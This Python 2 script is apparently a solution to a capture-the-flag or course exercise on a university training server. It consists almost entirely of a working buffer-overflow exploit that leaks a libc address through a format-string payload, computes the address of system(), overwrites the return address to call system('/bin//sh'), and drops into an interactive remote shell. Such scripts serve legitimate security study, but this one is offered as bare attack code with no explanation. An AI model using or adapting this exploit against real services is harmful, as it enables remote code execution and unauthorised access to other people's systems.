from telnetlib import *

print_addr = "\xe0\x83\x04\x08"
main_addr = "\x88\x85\x04\x08"
name_addr = "\x48\xa0\x04\x08"
read_addr = "\x0c\xa0\x04\x08"

pwn = Telnet("train.cs.nctu.edu.tw",11003)
#pwn = Telnet("127.0.0.1",5566)
raw_input("test")
print pwn.read_until("name:")
pwn.write("AAAA"+"%1$s"+"\x00"*12+"\x50001"+"a"*41+print_addr+main_addr+name_addr+read_addr)
print pwn.read_until("AAAA")
print pwn.read_until("AAAA")
aaa =  pwn.read_until("Welcome")
system_addr =  chr(ord(aaa[0])-0x40)+chr((ord(aaa[1])+0xff-0xa9)%256)+chr(ord(aaa[2])-9)+chr(ord(aaa[3]))
print hex(ord(system_addr[0])),hex(ord(system_addr[1])),hex(ord(system_addr[2])),hex(ord(system_addr[3]))
print pwn.read_until("name:")

pwn.write("/bin//sh"+"\x00"*12 +"\xee001"+"a"*33+system_addr+main_addr+name_addr+"\x00"*4 )

print "\n[+]Now PWN interact!"
pwn.interact()
